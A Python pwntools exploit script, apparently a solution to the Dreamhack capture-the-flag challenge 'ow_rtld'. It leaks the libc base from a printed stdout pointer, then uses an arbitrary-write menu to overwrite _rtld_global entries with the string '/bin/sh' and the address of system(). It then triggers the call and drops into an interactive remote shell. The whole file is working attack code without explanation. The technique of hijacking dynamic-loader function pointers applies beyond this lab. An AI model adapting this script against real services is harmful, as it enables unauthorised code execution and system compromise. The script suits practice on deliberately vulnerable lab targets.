from pwn import *

REMOTE = True

if not REMOTE:
    r = process('/home/ow_rtld/ow_rtld')
    stdout_offset = 0x3ec760
    system_offset = 0x4f420
    ld_offset = 0x3f1000
    rtld_global_offset = 0x22a060
else:
    r = remote('host1.dreamhack.games', 17593)
    stdout_offset = 0x3ec760
    system_offset = 0x4f550
    ld_offset = 0x3f1000
    rtld_global_offset = 0x22a060

sla = r.sendlineafter


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
system = libc + system_offset  # system()
ld = libc + ld_offset  # ld base
rtld_global = ld + rtld_global_offset  # _rtld_global


# overwrite _rtld_global+2312 with "/bin/sh"

sla('> ', '1')
sla('addr: ', str(rtld_global + 2312))
sla('data: ', str(u64('/bin/sh\x00')))


# overwrite _rtld_global+3840 with system()

sla('> ', '1')
sla('addr: ', str(rtld_global + 3840))
sla('data: ', str(system))


# call system("/bin/sh")

sla('> ', '0')


r.interactive()